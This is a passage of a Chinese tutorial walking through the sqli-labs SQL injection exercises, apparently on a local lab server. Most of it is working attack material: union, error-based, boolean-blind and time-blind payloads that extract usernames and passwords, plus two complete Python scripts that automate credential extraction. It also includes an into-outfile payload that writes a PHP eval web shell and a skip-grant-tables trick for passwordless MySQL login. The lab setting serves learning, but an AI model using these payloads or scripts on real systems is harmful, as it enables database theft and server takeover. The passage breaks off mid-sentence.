\n- 绕过测试\n\t-1' or 1=1 --+  //数字型注入\n- 常规操作获取用户名和密码\n\t-1' or 1=1  order by 3  --+ // 字段数为3\n\t学了注释符就需要实地去应用,可以看到这道题我们用注释符忽略了引号带来的影响\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-14bd86622ae5df5e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n```\n\t-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata  --+ // 获取数据库\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-8d2bbdcc76933073?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n```\n-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 'security'  --+ // 获取表\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-8b51ceae70d57c75?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n```\n-1' union select 1,2,group_concat(column_name ) from information_schema.columns where table_name like 'users'  --+ // 获取字段值\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-915b057c42b4bf3c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n-1' union select 1,2,group_concat(0x7e,username,0x7c,password) from users  --+ // 获取数据\n```\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-8bcb3abd043cbf7f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-3 基于错误的get单引号变形字符型注入\n\n这里普及一个知识点，如何不使用密码登录mysql，试想你拿到了一个用户的低权限账户，但是他对my.cnf 具有可写的权限，就可以通过修改my.cnf 进而登录数据库。如果数据库的存储方式可被允许，那么可以变像的提权。\n\n这里就不介绍他如何提权了。\n\nlinux的mysql配置文件在/etc/mysql/my.cnf下\n\n在[mysqld]下添加 skip-grant-tables 如图，\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-8e0d4b529a72ec1e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n之后重启mysql服务 \n\nmysql  service mysqld restart\n\n成功免密登录\n\n这里和前面闭合有所不同，来看一下源码\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-5dad96c1f8973704?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\nid先被引号包括，之后使用（）在包括，所以闭合方式也就需要 `')`\n\n```xml\n- 正常访问\n\thttp://192.168.248.144:8080/Less-3/?id=1\n\n\n- 绕过\n\tid=1') --+\n- 获取数据\n\t-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+\n\t-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users' --+\n\t-1') union select 1,2,group_concat(0x7c,username,0x7e,password,0x7c) from users --+\n```\n\n-猜测注入类型\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1 \n\n 根据这个提示猜测可能是字符型注入,可以和less-1 对比，发现多了一个） 可以判断首先是'$id' 之后在id外还有一层括号 ('$id')\n\n所以如果报错可以返回，那么如何绕过就变得很简单了。\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-0f1f899b0eea2733?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n获取数据，这里演示一下获取password\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-6e5ff6514ba0e85a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-4 基于错误的GET双引号字符型注入\n\n```xml\n- 正常访问\nhttp://192.168.248.144:8080/Less-4/?id=2\n\n- 绕过\n\tid=2\") or 1=1 --+\n- 获取数据\n\t-1\") union select 1,2,database()  --+\n\t-1\") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= database()  --+\n\t-1\") union select 1,2,group_concat(column_name) from information_schema.columns where table_name= 'users'  --+\n\t-1\") union select 1,2,group_concat(0x7c,username,0x7e,password,0x7c) from users  --+\n```\n\n```\n猜测注入类型\n2\"\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"2\"\") LIMIT 0,1' at line 1 \n可能是双引号字符型注入\n\n```\n\n先来看看为何加`'` 之后没有报错，\n\n我们经过几次演示，应该都知道id是被引号包括的 而如果包括的是单引号比如 `'$id'`，那么我们添加单引号会导致引号未闭合，报错，那如果是'$id\"'这种，虽然双引号没有闭合，但是他在闭合的单引号里，所以这里他的作用只是一个引号，而不是闭合作用，这就解释了 为何添加其他字符达不到闭合的目的。\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-f734188dae608fb0?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n这里我们就需要去试 那些字符可以产生闭合，导致报错，可以借助于我上面写的burp爆破\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-d4af7311d6d019f2?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n## Less-5 双注入GET单引号字符型注入\n\ntips： 双注\n\n```\nas ： 别名 \n\t顺便说几个常见的:\n\t\trand: 遵循四舍五入把原值转化为指定小数位数\n\t\tfloor: 向下舍入为指定小数位数\n\t\tceiling: 向上舍入为指定小数位数\n\trand: 返回一个介于 0 到 1（不包括 0 和 1）之间的伪随机 float 值\n\tgroup by: GROUP BY必须得配合聚合函数来用，根据字段来分类\n- 使用\nselect count(*) from [table] group by concat('~',([真正的查询语句]),'~'，floor(rand(0)*2))\n或\nselect count(*),concat_ws(char(32,58,32),([查询语句]),floor(rand(0)*2)) as a from [table] group by a\n- 原理\n简单来说就是count等聚合函数之后，如果使用分组语句，就会把查询的一部分以错误的形式显示出来\n```\n\n先来看看内部的查询返回的结果\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-a70f8d01370e467a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n在看看rand()函数，当不指定时 返回一个0-1的随机数\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-51154fe7ac31dfb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n而我们需要的是一个整数，这里就需要floor（） 返回的结果只有1和0 这样如果是0的时候就会引发报错，\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-2e371fdbac7b6765?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n在更进一步去查看，user表里有多少数据，就返回多少条\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-43cd4771b814747b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n而这一题没有回显 但是有报错，我们就需要构造特殊的语句，将数据显示在报错里，来读取数据\n\n可以看到 如果rand是1 没有报错 ，而rand值为0 则会触发报错，第五题会把报错返回，但是正确不会返回，所以我们利用双注可以从另一方面获取数据\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-753cae99175da40e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n接下来我们肯定不能通过多次执行获取报错值，经过研究，发现如果给`rand（0）` 这样就可以让他返回的值固定进而一直满足条件\n\n这里因为group by 查询时 如果返回的结果不一致就会导致报错。也就是说如果我们可以在检测时和插入时构造不同的返回值就会导致报错。\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-711fb703c1e57e27.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n赶紧进入实战学习学习\n\n\n\n```\n- 正常访问\n\thttp://192.168.248.144:8080/Less-5/?id=1\n- 猜测注入类型\n\tid='1\n\t You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1' LIMIT 0,1' at line 1\n\t 可能存在单引号注入\n- 绕过\n\t由于返回的结果只有两种（不包含报错）所以这里可以采用盲注来进行，但是作者的意图不是让我们使用盲注，而是双注.\n\t双注： 当查询语句的前面出现聚合函数 就是多个返回结果count()就是多行的意思 后面的查询结果代码会以错误的形式显示出来\n```\n\n```\n- 获取数据\n\t// 如果随机值为0 则会返回 you are in .....， 三条记录以上绝对报错 rand(0),两条随机报错\n\t-1' union all select count(*),2,concat( '~',(select schema_name from information_schema.schemata limit 4,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 \t// 获取 数据库 security 这里最好实用union all 这样，否则需要多次访问才能获取回复\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-ca2517b5d2b43740?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n剩下的就不一一叙述了\n-1' union all select count(*),2,concat( '~',(select table_name from information_schema.tables where table_schema = 'security' limit 3,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取表 users\n\t-1' union all select count(*),1,concat( '~',(select column_name from information_schema.columns where table_name= 'users' limit 2,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23  // 这里爆出了他三个字段，注意如果字段不存在也是返回you are in \n\t-1' union all select count(*),1,concat( '~',(select concat(id,username,password) from users limit 2,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23  // 成功拿到 password username\n```\n\n\n\n```\n这里也可以通过盲注去解决,先介绍一下盲注的命令\n- 试试盲注\n\t介绍几个语法：\n\t截取字符串： \n\t\tleft: Left ( string, n )  得到字符串左部指定个数的字符，\n\t\tsubstr: substr(string, start, length) 和substring()函数一样，截取字符串，第一个为处理的字符串，开始位置，长度 \n\t\tmid: MID(column_name,start[,length]) // 前两个字段为必须，length 为可选，选择开始字段，开始位置，截取长度。\n\tascii: \t返回字符串str的最左字符的数值,返回ascii值，0-255\n\tlength: 对字段长度破解，一般先对长度破解，然后在爆破字段值，这个一般采用二分法进行破解。\n\tstrcmp: 可以配合left 来使用，如果相等返回0 小于返回1 大于返回-1\n\tregexp: 通过regexp 和 正则表达式来获取字段 这个时候 会匹配所有的字段，所以limit已经不起作用\n\t\n\t1' and left(version(),1)=5 %23 // 判断当最左侧字符等于5时 返回you are in \n\t1' and left(version(),2)=5.%23 // 可以通过这样慢慢推出整个字段值\n\t\n\t使用substr 和ascii 来推出表名\n\t1' and ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) > 80 %23\n\t尝试使用regexp\n\t1' and (select 1 from information_schema.columns where table_name = 'users' and column_name regexp '^pass[a-z]' ;)=1 %23\n\t使用 ord mid \n\tord 和ascii 一样\n\tmid(column_name,start[,length]) // 从位置start开始，截取column_name字符串的length位，与substr作用相同\n\t这里就类似ascii(substr) == ord(mid())\n\tcast(username as char) 将 username 转成字符串\n\tifnull(exp1,exp2) exp1 不为null 则IFNULL()的返回值为exp1; 否则其返回值为exp2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。\n\t1 ' and ord(mid((select ifnull (cast(username as char), 0x20) from security.users order by id limit 0,1),1,1)) = 127 %23\n```\n\n\n\n## Less-6  双注入GET双引号字符型注入\n\n这道题和5类似，看一下源码\n\n```\n$id = '\"'.$id.'\"'; -- 虽然加了这么多  解读一下\n外层的单引号是做字符串用的，双引号是包含的， 里层的单引号是追加用的\n所以添加到查询语句中\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n这里的$id=\"$id\"\n$sql=\"SELECT * FROM users WHERE id=\"$id\" LIMIT 0,1\";\n所以 这里还是双引号的注入\n```\n\n\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-d35cb07daf8150ca?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n做法和5基本类似，只是修改了一些闭合\n\n\n\n```sql\n- 正常访问\n\thttp://192.168.248.144:8080/Less-5/?id=1\n- 猜测注入类型\n\t You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1\n\t 猜测语句\n\t select *  from users where id = \"xxx\" limit 0,1 ;\n- 尝试绕过\n\t发现当结果正确时返回 you are in ...... 否则返回错误。\n\t可以尝试报错注入 ，根据作者的意思，这题是一个双注\n\t那么按照双注的步骤走\n- payload\n\t//版本\n\t1\" union select count(*),2,concat_ws(char(58),(select version()) ,floor(rand(0)*2)) a from information_schema.schemata group by a %23\n\t// 获取数据库\n\t1\" union all select count(*),1,concat('~', (select schema_name from information_schema.schemata limit 4,1),floor(rand(0)*2)) a  from information_schema.schemata group by a %23\n\t// 获取表\n\t1 \" union all select count(*),1,concat('~',(select table_name from information_schema.tables where table_schema= database() limit 3,1),'~',floor(rand(0)*2)) a  from information_schema.tables group by a %23\n\t// 获取数据\n\t1\" union all select count(*),1,concat('~',(select concat(username,password) from users limit 0,1),'~',floor(rand(0)*2)) a  from information_schema.tables group by a %23\n```\n\n尝试获取一下password\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-e451aeda9bf6fe94?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## Less-7  导出文件GET字符型注入 \n\n这道题是个新的题型，如果可以写入文件，那么我们最简单的是上传一句话马 菜刀直接连，就可以获取一个低权限的账户，所以如果在注入中存在此类问题，那也是比较危险的漏洞。\n\n看看源码 是如何实现的，同样对于id没有进行过滤，可以通过')) 绕过\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-5bed08d6963dc9c5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-4faa63193977da4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n由于文件具有写的权限，所以可以通过into outfile 直接写入文件， 这里需要有几个条件，需要知道绝对路径写，，具有写的权限。\n\n```\n- 正常访问\n\tid=1\n\t You are in.... Use outfile......\n- 看来这题是要导出文件\n\tsqlmap 也可以执行相同的工作 这里就不解释了。\n\t使用outfile 写入到服务器，我们一般可以利用这个漏洞写入一句话马\n\t这里需要有两个已知项 1 字段值 2 绝对地址\n\t并且 系统必须有可读可写，在服务器上，完整的路径，\n\t导出命令： union select 1,2,3 into outfile \"绝对地址\" %23\n- paylaod\n\t// 一般web都存放在默认的目录下，比如：\n\t\t1 c:/inetpub/wwwroot/\n\t\t2 linux的nginx一般是/usr/local/nginx/html\n\t\t3 /home/wwwroot/default\n\t\t4 /usr/share/nginx\n\t\t5 /var/www/html\n\t然后 验证是否具有这几个条件\n\t1 获取文件权限的可读\n\t1')) and (select count(*) from mysql.user)>0 %23\n\t2 注入文件\n\t这里要求猜一下他的绝对路径\n\tid=-1')) union select 1,2,3 into outfile \"\\\\xxx\\\\1.txt\" %23\n\t之后使用\n\tid=-1')) union select 1,\"<?php @eval($_POST['giantbranch']);?>\" into outfile \"XXX\\test.php\" %23\n\t\n\t这里由于是使用docker，没有写成功\n```\n\n\n\n## Less-8 布尔型单引号GET盲注\n\n```\n前面已经介绍过一次盲注，由于只有正确和错误，并不返回错误的信息，所以我们可以通过判断是否正确来猜测数据的值\n\n```\n\n```\n-访问\n\tid=1\n\tYou are in...........\n- 测试返回内容\n\t看起来只返回了you are in ....... 和空 。看来这题需要使用盲注了\n- 相关函数\n\t之前已经说过一次，在简单提一下\n\tlength(str): 返回str字符串的长度\n\t\n\tsubstr(str,pos,len): 将str从pos位置开始截取len长度的字符串进行返回，注意这里的pos位置是从1开始的，不是数组的0开始\n\tmid(str,pos,len): 同上\n\t\n\tascii(str): 返回字符串str的最左边字符的ascii\n\tord(str): 同上\n\tif(a,b,c): a 为条件，正确返回b 否则返回c\n\t常见的ascii： A:65,Z:90 a:97,z:122,  0:48, 9:57\n\t获取数据库长度\n\t刚开始学，花了一天时间把脚本写好了，但是没有太完善就不发了，把简单的发一下\n\turl = \"http://192.168.248.144:8080/Less-8/?id=\"\n\t常规套路： 获取库，表，字段，下载数据\n\t显示获取数目，然后是每个的长度，在是每个的值\n\t获取数据库\n\t1' and length(database()) =\"+str(database_length)+\" %23\"\n\t1' and ascii(substr(database(),1))= 比较用的ascii值（0-128） %23\"\n\t获取表\n\t1' and (select count(*) from information_schema.tables where table_schema=database())= 表的个数 %23\n\t1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 这里写第几个表,1),1))=表的长度 %23\n\t1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit \"+第几个表+\",1),\"+表的第几个字母\",1)) =ascii值（0-128） %23\n\t字段和他类似\n\t数据，选一个写\n\t1' and (select count(*) from users )= 个数 %23\n\t1' and length(substr((select username from users limit 第几个数据,1),1))=数据的长度 %23\n\t1' and ascii(substr((select \"+value+\" from users limit 第几个数据,1),数据的第几位,1)) =ascii 值 %23\n```\n\n```python\n这里上一下写的py脚本\nfrom urllib import request\nfrom urllib import parse\nimport re\n\nurl = \"http://192.168.64.135/Less-8/?id=\"\n\n#1 查数据库\n# def length():\ndatabase_length = 0\nwhile True:\n    param = \"1' and length(database()) =\"+str(database_length)+\" #\"\n    response = request.urlopen(url+ parse.quote(param)).read().decode()\n\n    if (re.search(\"You are in\",response)):\n        #print(\"DATABASE_LENGTH:\"+str(database_length))\n        break\n    else:\n        database_length += 1\n\n# db_name = \"\"\n# for l in range(database_length):\n#     for a in range(128):\n#         param = \"1' and ascii(substr(database(),\"  +  str(l+1) +  \"))=\"  +  str(a) +  \"#\"\n#         response = request.urlopen(url + parse.quote(param)).read().decode()\n#         if (re.search(\"You are in\",response)):\n#             db_name += chr(a)\n#             break\n# print(\"[*]:\"+db_name)\n\n#尝试二分法扫描\ndb_name = \"\"\nfor l in range(database_length):\n    a,b = 64,64\n    while True:\n        b = int(b/2)\n        param = \"1' and ascii(substr(database(),\"  +  str(l+1) +  \"))<\"  +  str(a) +  \"#\"\n        response = request.urlopen(url + parse.quote(param)).read().decode()\n        if (re.search(\"You are in\",response)):\n            a -=b\n        else:\n            param = \"1' and ascii(substr(database(),\"+str(l+1)+\")) =\"+str(a)+\" #\"\n            response = request.urlopen(url + parse.quote(param)).read().decode()\n            if (re.search(\"You are in\",response)):\n                db_name += chr(a)\n                break\n            else:\n                a +=b\nprint(\"db_name:\"+ db_name)\nprint('table:')\n#2 查表数量\ntable_num = 0\n\nwhile True:\n    param = \"1' and (select count(*) from information_schema.tables where table_schema=database())=\"+str(table_num)+\" #\"\n    response = request.urlopen(url + parse.quote(param)).read().decode()\n\n    if (re.search(\"You are in\",response)):\n        #print(\"table_num:\"+str(table_num))\n        break\n    else:\n        table_num += 1\n\n# 查 表长度\ndef ta_length(num):\n    table_length = 0\n    while True:\n        param = \"1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit \"+str(num)+\",1),1))=\"+str(table_length)+\" #\"\n        response = request.urlopen(url + parse.quote(param)).read().decode()\n\n        if (re.search(\"You are in\",response)):\n            return table_length\n            break\n        else:\n            table_length += 1\n# 查表\nfor n in range(table_num):\n    table_name =\"\"\n    for l  in range(ta_length(n)): # 表的长度\n        for a in range(0,128): #爆破表\n            param = \"1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit \"+str(n)+\",1),\"+str(l+1)+\",1)) =\"+str(a)+\" #\"\n            response = request.urlopen(url + parse.quote(param)).read().decode()\n            if (re.search(\"You are in\", response)):\n                table_name += chr(a)\n                break\n    print(\"[*]:\" + table_name)\n\n# 3 查字段\n# 查字段个数\ncolumns_num = 0\nwhile True:\n    param = \"1' and (select count(*) from information_schema.columns where table_name='users')=\"+str(columns_num)+\" #\"\n    response = request.urlopen(url + parse.quote(param)).read().decode()\n\n    if (re.search(\"You are in\",response)):\n        print(\"columns:\"+str(columns_num))\n        break\n    else:\n        columns_num += 1\n\n# 查每个字段的长度\ndef co_length(num):\n    columns_length = 0\n    while True:\n        param = \"1' and length(substr((select column_name from information_schema.columns where table_name='users' limit \"+str(num)+\",1),1))=\"+str(columns_length)+\" #\"\n        response = request.urlopen(url + parse.quote(param)).read().decode()\n\n        if (re.search(\"You are in\",response)):\n            #print(columns_length)\n            return columns_length\n            break\n        else:\n            columns_length += 1\n# 查每个字段的值\nfor n in range(columns_num):\n    columns_name =\"\"\n    for l  in range(co_length(n)): # 表的长度\n        for a in range(0,128): #爆破表\n            param = \"1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit \"+str(n)+\",1),\"+str(l+1)+\",1)) =\"+str(a)+\" #\"\n            response = request.urlopen(url + parse.quote(param)).read().decode()\n            if (re.search(\"You are in\", response)):\n                columns_name += chr(a)\n                break\n    print(\"[*]:\" +columns_name)\n\n# 下载数据\n\n# 查 username\n\nnum = 0\nwhile True:\n    param = \"1' and (select count(*) from users )= \"+str(num)+\"#\"\n    response = request.urlopen(url + parse.quote(param)).read().decode()\n\n    if (re.search(\"You are in\",response)):\n        print(\"num:\"+str(num))\n        break\n    else:\n        num += 1\n\ndef length(num):\n    user_length = 0\n    while True:\n        param = \"1' and length(substr((select username from users limit \"+str(num)+\",1),1))=\"+str(user_length)+\" #\"\n        response = request.urlopen(url + parse.quote(param)).read().decode()\n\n        if (re.search(\"You are in\",response)):\n            #print(user_length)\n            return user_length\n            break\n        else:\n            user_length += 1\ndef Name(value1,value2):\n    for n in range(num):\n        columns_name =\"\"\n        for l  in range(length(n)): # 表的长度\n            for a in range(0,128): #爆破表\n                param = \"1' and ascii(substr((select \"+value1+\" from users limit \"+str(n)+\",1),\"+str(l+1)+\",1)) =\"+str(a)+\" #\"\n                response = request.urlopen(url + parse.quote(param)).read().decode()\n                if (re.search(\"You are in\", response)):\n                    columns_name += chr(a)\n                    break\n        print(\"[*]:\" +columns_name,end=\":\")\n        columns_name2 = \"\"\n        for l in range(length(n)):  # 表的长度\n            for a in range(0, 128):  # 爆破表\n                param = \"1' and ascii(substr((select \" + value2 + \" from users limit \" + str(n) + \",1),\" + str(\n                    l + 1) + \",1)) =\" + str(a) + \" #\"\n                response = request.urlopen(url + parse.quote(param)).read().decode()\n                if (re.search(\"You are in\", response)):\n                    columns_name2 += chr(a)\n                    break\n        print(columns_name2)\nName(\"username\",\"password\")\n\n```\n\n成功获取到了数据库的值，\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-e3083873d730a225.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n## Less-9  基于时间的GET单引号盲注\n\n```\n8和9 一样，只是修改了一下闭合形式，第一次出现盲注，看一下源码，没有什么难度，这里使用时间盲注去猜\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-0ae34c6a6fa7686f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n- 相关函数\n\t这一关需要用到一个if函数 \n\tIF(expr1,expr2,expr3) ：既可以作为表达式用，也可在存储过程中作为流程控制语句使用\n\texpr1 是判断条件 ，成立执行expr2 不成立执行 expr3\n\t还有一个sleep(seconds) ：执行延迟seconds秒\n```\n\n\n\n```\n- 尝试触发报错\n\thttp://192.168.248.144:8080/Less-9/?id=1' and sleep(5) %23\n\t在尝试sleep()的时候发现了延迟 存在 时间盲注\n- 脚本 \n\t将上一关的改一下 ，所有的放在expr1里执行\n\t这里 就把上一关的代码放进expr1 然后 if(代码，sleep(0.1),1)\n\t之后 在判断条件改成 判断时间就行\n```\n\n```\n这里的脚本使用了time函数库，经过检测，发现这个库比较精确。可以将延时时间设置为0.1 秒，可以精确判断\n# less-9  基于时间的单引号注入\nfrom urllib import request\nfrom urllib import parse\nfrom time import  time\n\nurl = \"http://192.168.64.135/Less-9/?id=\"\n\n#1 查数据库\ndatabase_length = 0\nwhile True:\n    param = \"1' and if(length(database())=\"+str(database_length)+\",sleep(0.1),1) #\"\n    t = time()\n    response = request.urlopen(url + parse.quote(param))\n\n    if ( time() - t > 0.1 ):\n        print(\"DATABASE_LENGTH:\"+str(database_length))\n        break\n    else:\n        database_length += 1\n\n\ndb_name = \"\"\nfor l in range(database_length):\n    for a in range(128):\n\n        param = \"1' and if(ascii(substr(database(),\"  +  str(l+1) +  \"))=\"  +  str(a) + \",sleep(0.1),1) #\"\n        t = time()\n        response = request.urlopen(url + parse.quote(param))\n\n        if (time()-t >0.1):\n            db_name += chr(a)\n            break\nprint(\"[*]:\"+db_name)\n\n'''\n#尝试二分法扫描\ndb_name = \"\"\nfor l in range(database_length):\n    a,b = 64,64\n    while True:\n        b = int(b/2)\n        param = \"1' and ascii(substr(database(),\"  +  str(l+1) +  \"))<\"  +  str(a) +  \"#\"\n        response = request.urlopen(url + parse.quote(param)).read().decode()\n        if (re.search(\"You are in\",response)):\n            a -=b\n        else:\n            param = \"1' and ascii(substr(database(),\"+str(l+1)+\")) =\"+str(a)+\" #\"\n            response = request.urlopen(url + parse.quote(param)).read().decode()\n            if (re.search(\"You are in\",response)):\n                db_name += chr(a)\n                break\n            else:\n                a +=b\nprint(\"db_name:\"+ db_name)\n'''\n\n\n#2 查表数量\ntable_num = 0\n\nwhile True:\n    param = \"1 ' and if((select count(*) from information_schema.tables where table_schema=database())=\"+str(table_num)+\",sleep(0.1),1) #\"\n    t = time()\n    response = request.urlopen(url + parse.quote(param))\n    if (time() - t > 0.1 ):\n        print(\"table_num:\"+str(table_num))\n        break\n    else:\n        table_num += 1\n\n# 查 表长度\ndef ta_length(num):\n    table_length = 0\n    while True:\n        param = \"1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit \"+str(num)+\",1),1))=\"+str(table_length)+\",sleep(0.1),1) #\"\n        t = time()\n        response = request.urlopen(url + parse.quote(param))\n        if (time() - t > 0.1 ):\n            return table_length\n            break\n        else:\n            table_length += 1\n\n# 查表\nfor n in range(table_num):\n    table_name =\"\"\n    for l  in range(ta_length(n)): # 表的长度\n        for a in range(0,128): #爆破表\n            param = \"1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit \"+str(n)+\",1),\"+str(l+1)+\",1)) =\"+str(a)+\",sleep(0.1),1) #\"\n            t = time()\n            response = request.urlopen(url + parse.quote(param))\n            if (time() - t > 0.1 ):\n                table_name += chr(a)\n                break\n    print(\"table_name:\" + table_name)\n\n\n# 3 查字段\n# 查字段个数\ncolumns_num = 0\nwhile True:\n    param = \"1' and if((select count(*) from information_schema.columns where table_name='users')=\"+str(columns_num)+\",sleep(0.1),1) #\"\n    t = time()\n    response = request.urlopen(url + parse.quote(param))\n    if (time() - t > 0.1):\n        print(\"columns_name:\"+str(columns_num))\n        break\n    else:\n        columns_num += 1\n\n# 查每个字段的长度\ndef co_length(num):\n    columns_length = 0\n    while True:\n        param = \"1' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit \"+str(num)+\",1),1))=\"+str(columns_length)+\",sleep(0.1),1) #\"\n        t = time()\n        response = request.urlopen(url + parse.quote(param))\n\n        if (time() - t > 0.1):\n            return columns_length\n            break\n        else:\n            columns_length += 1\n# 查每个字段的值\nfor n in range(columns_num):\n    columns_name =\"\"\n    for l  in range(co_length(n)): # 表的长度\n        for a in range(0,128): #爆破表\n            param = \"1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit \"+str(n)+\",1),\"+str(l+1)+\",1)) =\"+str(a)+\",sleep(0.1),1) #\"\n            t = time()\n            response = request.urlopen(url + parse.quote(param))\n            if (time() - t > 0.1):\n                columns_name += chr(a)\n                break\n    print(\"table_name:\" +columns_name)\n\n# 下载数据\n\n# 查 username\nnum = 0\nwhile True:\n    param = \"1' and if((select count(*) from users )= \"+str(num)+\",sleep(0.1),1)#\"\n    t = time()\n    response = request.urlopen(url + parse.quote(param)).read().decode()\n\n    if (time() - t > 0.1):\n        print(\"num:\"+str(num))\n        break\n    else:\n        num += 1\n\ndef length(num):\n    user_length = 0\n    while True:\n        param = \"1' and if(length(substr((select username from users limit \"+str(num)+\",1),1))=\"+str(user_length)+\",sleep(0.1),1) #\"\n        t = time()\n        response = request.urlopen(url + parse.quote(param)).read().decode()\n\n        if (time() - t > 0.1):\n            print(user_length)\n            return user_length\n            break\n        else:\n            user_length += 1\ndef Name(value1,value2):\n    for n in range(num):\n        columns_name1 = columns_name2 = \"\"\n        for l  in range(length(n)): # 表的长度\n            for a in range(0,128): #爆破表\n                param = \"1' and if(ascii(substr((select \"+value1+\" from users limit \"+str(n)+\",1),\"+str(l+1)+\",1)) =\"+str(a)+\",sleep(0.1),1) #\"\n                t = time()\n                response = request.urlopen(url + parse.quote(param))\n                if (time() - t > 0.1 ):\n                    columns_name1 += chr(a)\n                    break\n\n            for a in range(0,128): #爆破表\n                param = \"1' and if(ascii(substr((select \"+value2+\" from users limit \"+str(n)+\",1),\"+str(l+1)+\",1)) =\"+str(a)+\",sleep(0.1),1) #\"\n                t = time()\n                response = request.urlopen(url + parse.quote(param))\n                if (time() - t > 0.1 ):\n                    columns_name2 += chr(a)\n                    break\n        print(columns_name1+\":\"+columns_name2)\nName(\"username\",\"password\")\n```\n\n\n\n## Less-10 基于时间的双引号盲注\n\n```\n和9 一样，闭合有所改变，所以不多叙述\n- 尝试查询发现问题\nhttp://192.168.248.144:8080/Less-10/?id=1\" and sleep(5) %23\n发现当使用双引号的时候 可能触发时间注入\n这里和上题一样 把单引号改成双引号就ok\n\n```\n\n\n\n## Less-11 基于错误的PSOT单引号字符\n\n```\n直接看源码，没有过滤，所以可以将post的uname和passwd单独拿出来当get处理\n```\n\n![在这里插入图片描述](https://upload-images.jianshu.io/upload_images/18851353-67498f49f68fa588?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n```\n这里有个小点，一般我们在渗透中 遇到后台会使用万能密码去尝试，能否直接登录，而万能密码的原理就是注入，通过'等等去闭合然后 or 1=1 去获取一个正确的返回，之后用注释符闭合后面的查询，这样就可以绕过登录，直接进入后台 这里出现的漏洞是因为过滤不严格导致的。\n```\n\n```\n其实这里就是将get的错误在post里重新来了一遍\n- 正常登录\n\tadmin，admin\n\tYour Login name:admin Your Password:admin\n\t提交的数据都会回显到页面，尝试利用单引号 注释 构造\n- 加 ' 尝试报错\n \tadmin' -- admin 尝试登录\n \t You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 